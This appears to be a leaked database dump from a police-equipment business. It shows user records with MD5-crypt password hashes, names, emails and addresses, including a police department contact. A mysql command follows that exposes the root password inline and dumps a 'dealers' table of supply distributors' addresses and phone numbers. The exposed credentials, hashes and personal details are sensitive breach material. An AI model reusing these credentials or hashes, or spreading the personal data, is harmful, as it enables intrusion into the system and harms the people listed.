+|        190 | NULL             | NULL                                 | $1$nG62aACi$MBPClSU9qE9CEaeBidnTi/ | Dave      | Wilcox       | dwilcox@tssi-ops.com                   | Box 641                                            | NULL     | NULL     | Warrenton       | VA    | TSSI                                              | 20188   | NULL    | 540 347 2252    | Distributor |        0 |
+|        192 | NULL             | NULL                                 | $1$M86TwvY4$chYHZ7ArRcHDX.5Qzx8721 | James     | Minninger    | jminntbpd@comcast.net                  | 100 Penn Avenue                                    | NULL     | NULL     | Telford         | PA    | Telford Borough Police Dept                       | 18969   | NULL    | 215-723-6700    | Agency      |        0 |
++------------+------------------+--------------------------------------+------------------------------------+-----------+--------------+----------------------------------------+----------------------------------------------------+----------+----------+-----------------+-------+---------------------------------------------------+---------+---------+-----------------+-------------+----------+
+
+# mysql -uroot -pbigGoat csi -e 'select * from dealers'
++-----------------------------------+-----------------+----------+-----+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------+------------------------+-------+-----------------------------------------------------------------------------------------------------+-----------------------+----------+-------------+----------+------------------+
+| address                           | city            | dealerID | fax | mapLink                                                                                                                                                                                                                                                    | name                                               | phone                  | state | URL                                                                                                 | zip                   | password | accountType | approved | description      |
++-----------------------------------+-----------------+----------+-----+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------+------------------------+-------+-----------------------------------------------------------------------------------------------------+-----------------------+----------+-------------+----------+------------------+
+| 116 E. Ellison                    | Burleson        |      345 |     | http://maps.google.com/maps?q=116+e+ellison+burleson+tx+76028&hl=en&hnear=116+E+Ellison+St,+Burleson,+Texas+76028&t=m&z=16&vpsrc=0                                                                                                                         | Texas Gun Works                                    | (817) 447-7180         | TX    |                                                                                                     | 76028                 |          | Distributor |        1 |                  |
+| 15140 SE 82nd Drive, Suite 200    | Clackamas       |      330 |     | http://maps.google.com/maps?q=extreme+products&hl=en&hq=extreme+products&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                                     | Extreme Products, LLC                              | (503) 657-4806         | OR    | http://www.extreme-products.net/                                                                    | 97015                 |          | Distributor |        1 |                  |
+| 904 Perry Hwy # 1                 | Pittsburgh      |      331 |     | http://maps.google.com/maps?q=markl+supply&hl=en&sqi=2&hq=markl+supply&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                                       | Markl Supply, Co.                                  | (412) 358-9660         | PA    | http://www.marklsupply.com/                                                                         | 15229-1130            |          | Distributor |        1 |                  |
+| 401 S Sherman St # 215            | Richardson      |      332 |     | http://maps.google.com/maps?q=tactical+gear+now+inc&hl=en&sqi=2&hq=tactical+gear+now+inc&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                     | Tactical Gear Now, Inc.                            | (972) 960-9394 () â€Ž    | TX    | http://www.tacticalgearnow.com/                                                                     | 75081-4059            |          | Distributor |        1 |                  |
+| 107 S. Commercial                 | Emmett          |      314 |     |                                                                                                                                                                                                                                                            | Enforcement & Shooting Equipment                   | (208) 365-4272         | ID    |                                                                                                     | 83617-2933            |          | Distributor |        1 |                  |
+| 3318 W. Devon Ave.                | Lincolnwood     |      315 |     | http://maps.google.com/maps?q=shore+galleries+chicago&hl=en&sqi=2&hq=shore+galleries&hnear=Chicago,+Cook,+Illinois&t=m&z=11&vpsrc=0                                                                                                                        | Shore Galleries                                    | (847) 676-2900         | IL    | http://www.shoregalleries.com/                                                                      | 60712                 |          | Distributor |        1 |                  |
+| 523 East Roosevelt Road           | Lombard         |      316 |     | http://maps.google.com/maps?q=ray+o\'herron+co.+inc&hl=en&sqi=2&hq=ray+o\'herron+co.+inc&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                     | Ray OHerron Co., Inc.                              | (630) 629-2677         | IL    | http://www.oherron.com/                                                                             | 60148-4631            |          | Distributor |        1 |                  |
+| 2802 Sable Mill Road              | Jeffersonville  |      317 |     | http://maps.google.com/maps?q=kiesler+police+supply&hl=en&sqi=2&hq=kiesler+police+supply&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                     | Kiesler Police Supply                              | (812) 288-5740         | IN    | http://www.kiesler.com/                                                                             | 47130                 |          | Distributor |        1 |                  |
+| 1105 Industry Rd.                 | Lexington       |      318 |     | http://maps.google.com/maps?q=1105+industry+rd+lexington+ky&hl=en&sqi=2&hnear=1105+Industry+Rd,+Lexington,+Kentucky+40505&t=m&z=16&vpsrc=0                                                                                                                 | Buds Police Supply                                 | (859) 368-0417         | KY    | http://www.budspolicesupply.com/catalog/index.php                                                   | 40505                 |          | Distributor |        1 |                  |
+| 16753 Industrial Parkway          | Lansing         |      320 |     | http://maps.google.com/maps?q=16753+Industrial+Parkway,+Lansing,+MI+48906&hl=en&sqi=2&hnear=16753+Industrial+Pkwy,+Lansing+Charter+Township,+Michigan+48906&t=m&z=16&vpsrc=0                                                                               | C.M.P. Distributors, Inc.                          | (517) 721-0970         | MI    | https://www.cmpdist.com/store/public/home.php                                                       | 48906                 |          | Distributor |        1 |                  |
+| 1460 E Ridge Rd                   | Rochester       |      343 |     | http://maps.google.com/maps?q=new+york+police+supply&hl=en&hq=new+york+police+supply&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                         | New York Police Supply                             | (585) 467-1374         | NY    | http://www.nypolicesupply.com/                                                                      | 14621                 |          | Distributor |        1 |                  |
+| 15765 S. Keeler St.               | Olathe          |      307 |     | http://maps.google.com/maps?q=omb+guns&hl=en&sqi=2&hq=omb+guns&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                                               | OMB Guns                                           | (866) 509-1299         | KS    | http://www.ombguns.com/                                                                             | 66062                 |          | Distributor |        1 | test description |
+| 4450 60th Avenue North            | St. Petersburg  |      308 |     | http://maps.google.com/maps?q=srt+supply+inc&hl=en&sqi=2&hq=srt+supply+inc&radius=15000&t=m&z=13&vpsrc=0                                                                                                                                                   | SRT Supply, Inc.                                   | (727)-526-5451         | FL    | http://www.srtsupply.com/                                                                           | 33714                 |          | Distributor |        1 |                  |
+| 4864 Ash Street                   | Forest Park     |      309 |     | http://maps.google.com/maps?q=tactical+gear+supply&hl=en&sqi=2&hq=tactical+gear+supply&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                       | Tactical Gear Supply                               | (404) 366-0631         | GA    | http://www.tacgear.com/                                                                             | 30297                 |          | Distributor |        1 |                  |
+| 4800 Atlanta Hwy                  | Bogart          |      310 |     | http://maps.google.com/maps?q=clyde+armory&hl=en&sqi=2&hq=clyde+armory&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                                       | Clyde Armory                                       | (706) 549-1842         | GA    | http://www.policeguns.com/                                                                          | 30622                 |          | Distributor |        1 |                  |
+| 1000 S. Benton Dr., Suite 420     | Sauk Rapids     |      311 |     | http://maps.google.com/maps?q=keeprs&hl=en&sqi=2&hq=keeprs&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                                                   | KEEPRS                                             | 1-877-4KEEPRS          | MN    | http://www.keeprs.com/osCommerce/home.php                                                           | 56379                 |          | Distributor |        1 |                  |
+| 1322 Young St.                    | Honolulu        |      312 |     | http://maps.google.com/maps?q=security+equipment+corporation&hl=en&sqi=2&hq=security+equipment+corporation&radius=15000&t=m&z=16&vpsrc=0                                                                                                                   | Security Equipment Corp.                           | (808) 589-0911         | HI    | http://www.sechawaii.com/                                                                           | 96814-1815            |          | Distributor |        1 |                  |
+| 9047 Southwest Barbur Boulevard   | Portland        |      313 |     | http://maps.google.com/maps?q=blumenthal+uniforms&hl=en&sqi=2&hq=blumenthal+uniforms&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                         | Blumenthal Uniforms & Equipment                    | (503) 452-5055         | OR    | http://www.blumenthaluniforms.com/                                                                  | 97219-4001            |          | Distributor |        1 |                  |
+| 112 Woods Street                  | Philippi        |      337 |     | http://maps.google.com/maps?q=blackheart+international+llc&hl=en&sqi=2&hq=blackheart+international+llc&radius=15000&t=m&z=16&vpsrc=0                                                                                                                       | Blackheart International, LLC                      | (877) 244-8166         | WV    | http://www.bhigear.com/                                                                             | 26416-1136            |          | Distributor |        1 | Catalog Sales    |
+| 5189 South 300 West               | Murray          |      335 |     | http://maps.google.com/maps?q=farm+police+supply&hl=en&sqi=2&hq=farm+police+supply&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                           | FARM Police Supply                                 | (801)-313-0802         | UT    | http://farmpolicesupply.net/                                                                        | 84107                 |          | Distributor |        1 |                  |
+| 7609 Midlothian Turnpike          | Richmond        |      336 |     | http://maps.google.com/maps?q=southern+police+equipment&hl=en&sqi=2&hq=southern+police+equipment&radius=15000&t=m&z=16&vpsrc=0                                                                                                                             | Southern Police Equipment                          | (800) 542-5243         | VA    | http://www.southernpoliceequipment.com/                                                             | 23235                 |          | Distributor |        1 |                  |
+| 1204 Snowdon Drive                | Oshkosh         |      323 |     | http://maps.google.com/maps?q=advantage+police+supply&hl=en&sqi=2&hq=advantage+police+supply&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                 | Advantage Police Supply                            | (920) 235-6003         | WI    | http://www.advantagepolice-supply.com/Index.htm                                                     | 54904-8858            |          | Distributor |        1 |                  |
+| 9015 Airline Hwy                  | New Orleans     |      319 |     | http://maps.google.com/maps?q=american+police+equipment,+inc&hl=en&hq=american+police+equipment,+inc&hnear=New+Orleans,+Orleans,+Louisiana&t=m&z=14&vpsrc=0                                                                                                | American Police Equipment, Inc.                    | (504) 482-6390         | LA    | http://www.ape911.com/                                                                              | 70118                 |          | Distributor |        1 |                  |
+| 1088 N 1st Street                 | San Jose        |      292 |     | http://maps.google.com/maps?q=lc+action&hl=en&sqi=2&hq=lc+action&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                                             | LC Action                                          | (408) 294-2677         | CA    | http://www.lcaction.com/                                                                            | 95112                 |          | Distributor |        1 |                  |
+| 5120 Osage Street #200            | Denver          |      293 |     | http://maps.google.com/maps?q=neves+uniforms&hl=en&hq=neves+uniforms&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                                         | Neves Uniforms                                     | (303) 455-7000         | CO    | http://www.nevesuniforms.com/                                                                       | 80221                 |          | Distributor |        1 |                  |
+| 6350 Wadsworth Blvd               | Arvada          |      294 |     | http://maps.google.com/maps?q=precinct+police+products&hl=en&hq=precinct+police+products&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                     | Precinct Police Products                           | (303) 421-1515         | CO    | http://www.precinctpoliceproducts.com/                                                              | 80003                 |          | Distributor |        1 |                  |
+| 2112 Elk Vale Road                | Rapid City      |      295 |     | http://maps.google.com/maps?q=Ultramax+Ammunition,+Elk+Vale+Road,+Rapid+City,+SD&hl=en&hq=Ultramax+Ammunition,&hnear=Elk+Vale+Rd,+Rapid+City,+South+Dakota&t=m&z=14&vpsrc=0                                                                                | Ultramax Ammunition                                | (800) 345-5852         | SD    | http://www.ultramaxammunition.com/home.html                                                         | 57701                 |          | Distributor |        1 |                  |
+| 915 Timber Trail                  | Cedar Park      |      334 |     |                                                                                                                                                                                                                                                            | X2 Extreme Tactical, LLC                           | (954) 591-6508         | TX    | http://www.x2extreme.com/                                                                           | 78613                 |          | Distributor |        1 |                  |
+| 110 Athens West Parkway, Suite B  | Athens          |      341 |     | http://maps.google.com/maps?q=110+athens+west+parkway,+athens+ga&hl=en&hnear=110+Athens+W+Pkwy,+Athens,+Georgia+30606&t=m&z=16&vpsrc=0                                                                                                                     | KEEPRS                                             | (706) 549-3434         | GA    | http://www.keeprs.com/osCommerce/home.php                                                           | 30606                 |          | Distributor |        1 |                  |
+| 205 West Floyce Street            | Ruleville       |      286 |     | http://maps.google.com/maps?q=Precision+Delta+Corporation,+West+Floyce+Street,+Ruleville,+MS&hl=en&sll=33.726888,-90.553102&sspn=0.007442,0.016469&vpsrc=0&hq=Precision+Delta+Corporation,&hnear=W+Floyce+St,+Ruleville,+Sunflower,+Mississippi+38771&t=m& | Precision Delta Corporation                        | (800) 337-3621         | MS    | http://www.precisiondelta.com/                                                                      | 38771                 |          | Distributor |        1 |                  |
+| 4147 Old Seward Highway           | Anchorage       |      287 |     | http://maps.google.com/maps?q=northern+security&hl=en&hq=northern+security&radius=15000&t=m&z=13&vpsrc=0&iwloc=A                                                                                                                                           | Northern Security Supply, Inc.                     | (907) 561-5602         | AK    | http://www.northernsecuritysupplyak.com/                                                            | 99503                 |          | Distributor |        1 |                  |
+| 170 South Kolb Road               | Tucson          |      289 |     | http://maps.google.com/maps?q=diamondback+police+supply&hl=en&sqi=2&hq=diamondback+police+supply&radius=15000&t=m&z=16&vpsrc=0                                                                                                                             | Diamondback Police Supply                          | (520) 886-8338         | AZ    | http://www.dbackpolice.com/                                                                         | 85710                 |          | Distributor |        1 |                  |
+| 334 West Olive Avenue             | Memphis         |      290 |     | http://maps.google.com/maps?q=accurate+law+enforcement+memphis,+tn&hl=en&sll=41.58501,-80.169682&sspn=3.426484,8.432007&vpsrc=0&hq=accurate+law+enforcement&hnear=Memphis,+Shelby,+Tennessee&t=m&z=13                                                      | Accurate Law Enforcement                           | (901) 774-9595         | TN    | http://www.accuratelawenforcement.com/                                                              | 38101                 |          | Distributor |        1 |                  |
+| 34 Barstow Street                 | Mattapoisett    |      296 |     | http://maps.google.com/maps?q=Central+Equipment+Co+Inc,+Barstow+Street,+Mattapoisett,+MA&hl=en&sll=41.66291,-70.816712&sspn=0.010804,0.018368&oq=central+equipment+mattapoisett+ma&hq=Central+Equipment+Co+Inc,&hnear=Barstow+St,+Mattapoisett,+Massachuse | Central Equipment Co.                              | (508) 758-3758         | MA    |                                                                                                     | 2739                  |          | Distributor |        1 |                  |
+| 104 Independence Way              |  Coatesville    |      299 |     | http://maps.google.com/maps?q=witmer+public+safety+g&hl=en&hq=witmer+public+safety+g&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                         | Witmer Public Safety Group, Inc.                   | (800) 852-6088         | PA    | http://www.officerstore.com/store/category.cfm/cid_1955_gould_goodrich_holsters/                    | 19320                 |          | Distributor |        1 |                  |
+| 3900 Early Rd                     | Harrisonburg    |      300 |     | http://maps.google.com/maps?q=Tactical+%26+Survival+Specialties,+Inc.,+Early+Road,+Harrisonburg,+VA&hl=en&sll=38.423303,-78.888768&sspn=0.090644,0.146942&oq=tactical+%26+survival+specialties+inc+&vpsrc=0&hq=Tactical+%26+Survival+Specialties,+Inc.,&hn | Tactical & Survival Specialties, Inc.              | (540) 434-8974         | VA    | http://www.tssi-ops.com/                                                                            | 22801                 |          | Distributor |        1 |                  |
+| 5521 White Horse Pike             | Egg Harbor City |      301 |     | http://maps.google.com/maps?q=lawmen+supply+co+egg+harbor+nj&hl=en&sll=37.636725,-76.657952&sspn=0.011453,0.018368&vpsrc=0&hq=lawmen+supply+co&hnear=Egg+Harbor+Township,+Atlantic,+New+Jersey&t=m&z=11                                                    | Lawmen Supply Co.                                  | (609) 965.7307         | NJ    | http://www.lawmensupply.com/                                                                        | 8215                  |          | Distributor |        1 |                  |
+| 7477 Old Alexandria Ferry Road    | Clinton         |      302 |     | http://maps.google.com/maps?q=lawmen+supply+7477+old+alexandria+ferry+road&hl=en&sqi=2&hq=lawmen+supply+7477+old+alexandria+ferry+road&radius=15000&t=m&z=16&vpsrc=0                                                                                       | Lawmen Supply Co.                                  | (301) 877.8884         | MD    | http://www.lawmensupply.com/                                                                        | 20735                 |          | Distributor |        1 |                  |
+| 1484 E. Lebanon Road, Rt 10       | Dover           |      303 |     | http://maps.google.com/maps?q=lawmen+supply+e.+lebanon+road,+dover&hl=en&sqi=2&hq=lawmen+supply+e.+lebanon+road,+dover&radius=15000&t=m&z=16&vpsrc=0                                                                                                       | Lawmen Supply Co.                                  | (302) 697.8740         | DE    | http://www.lawmensupply.com/                                                                        | 19901                 |          | Distributor |        1 |                  |
+| 1532 South Front Street           | Philadelphia    |      304 |     | http://maps.google.com/maps?q=firing+line+inc&hl=en&sqi=2&hq=firing+line+inc&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                                 | Firing Line, Inc.                                  | 215-336-1710           | PA    | http://www.firinglineinc.com/                                                                       | 19147                 |          | Distributor |        1 |                  |
+| 5221 W. Market St.                | Greensboro      |      305 |     | http://maps.google.com/maps?q=dana+safety+supply&hl=en&sqi=2&hq=dana+safety+supply&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                           | Dana Safety Supply                                 | (800) 845-0045         | NC    | http://www.danasafetysupply.com/                                                                    | 27409                 |          | Distributor |        1 |                  |
+| 3444 Breeze Point Court           | Linden          |      322 |     | http://maps.google.com/maps?q=great+lakes+emergency+products&hl=en&sqi=2&hq=great+lakes+emergency+products&hnear=Canton+Township,+Wayne,+Michigan&t=m&z=9&vpsrc=0                                                                                          | Great Lakes Emergency Products                     | (810) 836-1423         | MI    | http://www.greatlakesemergencyproducts.com/                                                         | 48451-0900            |          | Distributor |        1 |                  |
+| PMB 268                           | Babylon         |      324 |     | http://maps.google.com/maps?q=applied+tactical+technologies+inc&hl=en&sqi=2&hq=applied+tactical+technologies+inc&radius=15000&t=m&z=16&vpsrc=0                                                                                                             | Applied Tactical Technologies                      | 800-223-1204           | NY    | http://www.att-tactical.com/att_home.html                                                           | 11702-0268            |          | Distributor |        1 |                  |
+| 713 Hay St.                       | Fayetteville    |      327 |     |                                                                                                                                                                                                                                                            | Operator Safety Solutions                          | 910-774-9567           | NC    | http://ossops.com/index.html                                                                        | 28301                 |          | Distributor |        1 |                  |
+| 3723 Cleveland Avenue             | Columbus        |      328 |     | http://maps.google.com/maps?q=vances+outdoors&hl=en&sqi=2&hq=vances+outdoors&hnear=Columbus,+Franklin,+Ohio&t=m&z=11                                                                                                                                       | Vances Outdoors, Inc.                              | (614) 471-7353         | OH    | http://www.vancesle.com/                                                                            | 43224-3614            |          | Distributor |        1 |                  |
+| 1425 Sayles Boulevard             | Abilene         |      329 |     | http://maps.google.com/maps?q=big+country+supply&hl=en&sqi=2&hq=big+country+supply&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                           | Big Country Supply                                 | (325) 698-1683         | TX    | http://www.bigcountrysupply.com/                                                                    | (325) 698-1683 () â€Ž   |          | Distributor |        1 |                  |
+| 349 South Shelburne Road          | Greenfield      |      297 |     | http://maps.google.com/maps?q=sherburnes,+llc+349+south+shelburne+road,+greenfield+ma+01203&hl=en&sll=37.0625,-95.677068&sspn=57.249013,134.912109&vpsrc=0&hq=sherburnes,+llc+349+south+shelburne+road,+greenfield&hnear=Pittsfield,+Massachusetts+01203&t | Sherburnes, LLC                                    | (800) 628-3024         | MA    |                                                                                                     | 1302                  |          | Distributor |        1 |                  |
+| 6000 East Shirley Lane            | Montgomery      |      285 |     | http://maps.google.com/maps?q=gulf+state+distributors&hl=en&hq=gulf+state+distributors&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                       | Gulf States Distributors                           | (334) 271-2011         | AL    | http://www.gulfstatesdist.com/                                                                      | 36117                 |          | Distributor |        1 |                  |
+| 180 Cassia Way #507               | Henderson       |      342 |     | http://maps.google.com/maps?q=long+mountain+outfitters&hl=en&hq=long+mountain+outfitters&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                     | Long Mountain Outfitters                           | (702) 564-0948         | NV    | http://www.longmountain.com/                                                                        | 89014                 |          | Distributor |        1 |                  |
+| 4410 Craftsman Drive              | Raleigh         |      326 |     | http://maps.google.com/maps?q=eagle+one+law+enforcement&hl=en&sqi=2&hq=eagle+one+law+enforcement&hnear=Raleigh,+Wake,+North+Carolina&t=m&z=11&vpsrc=0                                                                                                      | Eagle One Law Enforcement                          | (919) 954-1032         | NC    | http://eagle1supply.com/                                                                            | 27609                 |          | Distributor |        1 |                  |
+| 1255 Northwest 17th Avenue # 2    | Delray Beach    |      344 |     | http://maps.google.com/maps?q=tactical+products+group&hl=en&sqi=2&hq=tactical+products+group&radius=15000&t=m&z=16                                                                                                                                         | Tactical Products Group                            | (561) 265-4066         | FL    | http://www.tacprogroup.com/                                                                         | 33445                 |          | Distributor |        1 |                  |
+| 2680 Palumbo Drive                | Lexington       |      426 |     | http://maps.google.com/maps?q=galls&hl=en&hq=galls&hnear=Lexington,+Fayette,+Kentucky&t=m&z=13&iwloc=A                                                                                                                                                     | Galls, Inc. (Handcuffs & Restraints)               | (859) 266-7227         | KY    | http://www.galls.com/home                                                                           | 40555                 |          | Distributor |        1 |                  |
+| 500 East Main Street              | Kilgore         |      333 |     | http://maps.google.com/maps?q=nardis+inc&hl=en&sqi=2&hq=nardis+inc&radius=15000&t=m&z=16&vpsrc=0                                                                                                                                                           | Nardis, Inc                                        | (800) 947-0087         | TX    | http://www.nardisinc.com/                                                                           | 75662                 |          | Distributor |        1 |                  |
+| 7815 West 4th Ave                 | Hialeah         |      306 |     | http://maps.google.com/maps?q=Lous+Police+Supply&hl=en&sll=34.061188,-118.348409&sspn=0.09585,0.146942&vpsrc=0&hq=Lous+Police+Supply&radius=15000&t=m&z=13                                                                                                 | Lous Police Supply                                 | (305) 416-0000         | FL    | http://www.louspolice.com/                                                                          | 33014                 |          | Distributor |        1 |                  |
+| 2821 Metropolitan  Place          | Pomona          |      291 |     | http://maps.google.com/maps?q=All+State+Police+Equipment,+Metropolitan+Place,+Pomona,+CA&hl=en&sll=35.111012,-90.073355&sspn=0.117115,0.2635&vpsrc=0&hq=All+State+Police+Equipment,&hnear=Metropolitan+Pl,+Pomona,+California&t=m&z=17                     | All State Police Equipment, Co.                    | (909) 596-2470         | CA    | http://www.allstatepolice.com/contactUs.php                                                         | 91767                 |          | Distributor |        1 |                  |
+| 3042 Chevlon Road                 | Overgaard       |      288 |     | http://maps.google.com/maps?q=combat+cartridge+3042+chevlon+road,+overgaard+az+85933&hl=en&sll=37.0625,-95.677068&sspn=57.249013,134.912109&vpsrc=1&hq=combat+cartridge&hnear=3042+Chevlon+Rd,+Heber-Overgaard,+Navajo,+Arizona+85928&t=m&z=15&iwloc=A     | Combat Cartridge                                   | (928) 535-5615         | AZ    |                                                                                                     | 85933                 |          | Distributor |        1 |                  |
+| 230 Central Avenue                | Albany          |      298 |     | http://maps.google.com/maps?q=Rosens+230+Central+Avenue,+Albany,+NY&hl=en&sll=42.662854,-73.77033&sspn=0.008536,0.021136&vpsrc=0&hq=Rosens&hnear=230+Central+Ave,+Albany,+New+York+12206&t=m&z=16                                                          | Rosens Uniforms & Tactical Gear                    | (800) 434-1376         | NY    | http://www.rosensuniforms.com/                                                                      | 12206                 |          | Distributor |        1 |                  |
+| 3270 Gulf Freeway South           | League City     |      339 |     | http://maps.google.com/maps?q=the+arms+room&hl=en&hq=the+arms+room&hnear=League+City,+Galveston,+Texas&t=m&z=12&vpsrc=0                                                                                                                                    | The Arms Room, LLC                                 | (832) 226-5252         | TX    | http://www.thearmsroomtx.com/                                                                       | 77573                 |          | Distributor |        1 |                  |
+| 134 North Main Street             | Fuquay-Varina   |      424 |     | http://maps.google.com/maps?q=bob+barker+company+inc&hl=en&sqi=2&hq=bob+barker+company+inc&hnear=Fuquay-Varina,+Wake,+North+Carolina&t=m&z=16                                                                                                              | Bob Barker Co. (Handcuffs & Restraints)            | (800) 334-9880         | NC    | https://www.bobbarker.com/web/default.asp?AppriseCustCode=WEBGUEST&AppriseWebKey=033700828.02402759 | 27526-1934            |          | Distributor |        1 |                  |
+|                                   |                 |      348 |     | http://maps.google.com/maps?q=accurate+law+enforcement&hl=en&hq=accurate+law+enforcement&hnear=Memphis,+Shelby,+Tennessee&t=m&z=12&vpsrc=0                                                                                                                 | Accurate Law Enforcement                           | (901) 774-9595         | AR    | http://www.accuratelawenforcement.com/                                                              |                       |          | Distributor |        1 |                  |
+|                                   |                 |      349 |     | http://maps.google.com/maps?q=precision+delta+corp&hl=en&hq=precision+delta+corp&hnear=Ruleville,+Sunflower,+Mississippi&t=m&z=16&vpsrc=0                                                                                                                  | Precision Delta Corporation                        | (800) 337-3621         | AR    | http://www.precisiondelta.com/                                                                      |                       |          | Distributor |        1 |                  |
+|                                   |                 |      350 |     | http://maps.google.com/maps?q=accurate+law+enforcement&hl=en&hq=accurate+law+enforcement&hnear=Memphis,+Shelby,+Tennessee&t=m&z=12&vpsrc=0                                                                                                                 | Accurate Law Enforcement                           | (901) 77-.9595         | MS    | http://www.accuratelawenforcement.com/                                                              |                       |          | Distributor |        1 | blah blah        |
+| 2401 Colonial Ave                 | Norfolk         |      423 |     | http://maps.google.com/maps?q=handcuff+warehouse&hl=en&sqi=2&hq=handcuff+warehouse&hnear=Norfolk,+Virginia&t=m&z=13                                                                                                                                        | Handcuff Warehouse (Handcuffs & Restraints)        | 888-346-9732           | VA    | http://www.handcuffwarehouse.com/                                                                   | 23517                 |          | Distributor |        1 |                  |
+|                                   |                 |      352 |     | http://maps.google.com/maps?q=ultramax+ammo&hl=en&hq=ultramax+ammo&hnear=Rapid+City,+Pennington,+South+Dakota&t=m&z=13&vpsrc=0                                                                                                                             | Ultramax Ammunition                                | (800) 345-5852         | CO    | http://www.ultramaxammunition.com/home.html                                                         |                       |          | Distributor |        1 |                  |
+|                                   |                 |      353 |     | http://maps.google.com/maps?q=ultramax+ammo&hl=en&hq=ultramax+ammo&hnear=Rapid+City,+Pennington,+South+Dakota&t=m&z=13&vpsrc=0                                                                                                                             | Ultramax Ammunition                                | (800) 345-5852         | ID    | http://www.ultramaxammunition.com/home.html                                                         |                       |          | Distributor |        1 |                  |
+|                                   |                 |      354 |     | http://maps.google.com/maps?q=ultramax+ammo&hl=en&hq=ultramax+ammo&hnear=Rapid+City,+Pennington,+South+Dakota&t=m&z=13&vpsrc=0                                                                                                                             | Ultramax Ammunition                                | (800) 345-5852         | MT    | http://www.ultramaxammunition.com/home.html                                                         |                       |          | Distributor |        1 |                  |
+|                                   |                 |      355 |     | http://maps.google.com/maps?q=ultramax+ammo&hl=en&hq=ultramax+ammo&hnear=Rapid+City,+Pennington,+South+Dakota&t=m&z=13&vpsrc=0                                                                                                                             | Ultramax Ammunition                                |  (800) 345-5852        | ND    | http://www.ultramaxammunition.com/home.html                                                         |                       |          | Distributor |        1 |                  |
+|                                   |                 |      356 |     | http://maps.google.com/maps?q=ultramax+ammo&hl=en&hq=ultramax+ammo&hnear=Rapid+City,+Pennington,+South+Dakota&t=m&z=13&vpsrc=0                                                                                                                             | Ultramax Ammunition                                |  (800) 345-5852        | WY    | http://www.ultramaxammunition.com/home.html                                                         |                       |          | Distributor |        1 |                  |
+|                                   |                 |      357 |     | http://maps.google.com/maps?q=precision+delta+corp&hl=en&hq=precision+delta+corp&hnear=Ruleville,+Sunflower,+Mississippi&t=m&z=16&vpsrc=0                                                                                                                  | Precision Delta Corporation                        | (662) 756-2810 ()      | LA    | http://www.precisiondelta.com/                                                                      |                       |          | Distributor |        1 |                  |
+|                                   |                 |      358 |     | http://maps.google.com/maps?q=Central+Equipment+Co+Inc,+Barstow+Street,+Mattapoisett,+MA&hl=en&sll=41.66291,-70.816712&sspn=0.010804,0.018368&oq=central+equipment+mattapoisett+ma&hq=Central+Equipment+Co+Inc,&hnear=Barstow+St,+Mattapoisett,+Massachuse | Central Equipment Co.                              | (508) 758-3758         | CT    |                                                                                                     |                       |          | Distributor |        1 |                  |
+|                                   |                 |      359 |     | http://maps.google.com/maps?q=central+equipment+company+mattapoisett+ma&hl=en&hq=central+equipment+company+mattapoisett+ma&radius=15000&t=m&z=16&vpsrc=0                                                                                                   | Central Equipment Co.                              | (508) 758-3758         | ME    |                                                                                                     |                       |          | Distributor |        1 |                  |
+|                                   |                 |      360 |     | http://maps.google.com/maps?q=Central+Equipment+Co+Inc,+Barstow+Street,+Mattapoisett,+MA&hl=en&sll=41.66291,-70.816712&sspn=0.010804,0.018368&oq=central+equipment+mattapoisett+ma&hq=Central+Equipment+Co+Inc,&hnear=Barstow+St,+Mattapoisett,+Massachuse | Central Equipment Co.                              | (508) 758-3758         | NH    |                                                                                                     |                       |          | Distributor |        1 |                  |
+|                                   |                 |      361 |     | http://maps.google.com/maps?q=Central+Equipment+Co+Inc,+Barstow+Street,+Mattapoisett,+MA&hl=en&sll=41.66291,-70.816712&sspn=0.010804,0.018368&oq=central+equipment+mattapoisett+ma&hq=Central+Equipment+Co+Inc,&hnear=Barstow+St,+Mattapoisett,+Massachuse | Central Equipment Co.                              | (508) 758-3578         | RI    |                                                                                                     |                       |          | Distributor |        1 |                  |
+|                                   |                 |      362 |     | http://maps.google.com/maps?q=Central+Equipment+Co+Inc,+Barstow+Street,+Mattapoisett,+MA&hl=en&sll=41.66291,-70.816712&sspn=0.010804,0.018368&oq=central+equipment+mattapoisett+ma&hq=Central+Equipment+Co+Inc,&hnear=Barstow+St,+Mattapoisett,+Massachuse | Central Equipment Co.                              | (508) 758-3758         | VT    |                                                                                                     |                       |          | Distributor |        1 |                  |
+|                                   |                 |      363 |     | http://maps.google.com/maps?q=sherburnes,+llc+349+south+shelburne+road,+greenfield+ma+01203&hl=en&sll=37.0625,-95.677068&sspn=57.249013,134.912109&vpsrc=0&hq=sherburnes,+llc+349+south+shelburne+road,+greenfield&hnear=Pittsfield,+Massachusetts+01203&t | Sherburne, LLC                                     | (800) 628-3024         | CT    |                                                                                                     |                       |          | Distributor |        1 |                  |
+|                                   |                 |      364 |     | http://maps.google.com/maps?q=sherburnes,+llc+349+south+shelburne+road,+greenfield+ma+01203&hl=en&sll=37.0625,-95.677068&sspn=57.249013,134.912109&vpsrc=0&hq=sherburnes,+llc+349+south+shelburne+road,+greenfield&hnear=Pittsfield,+Massachusetts+01203&t | Sherburne, LLC                                     | (800) 628-3024         | ME    |                                                                                                     |                       |          | Distributor |        1 |                  |
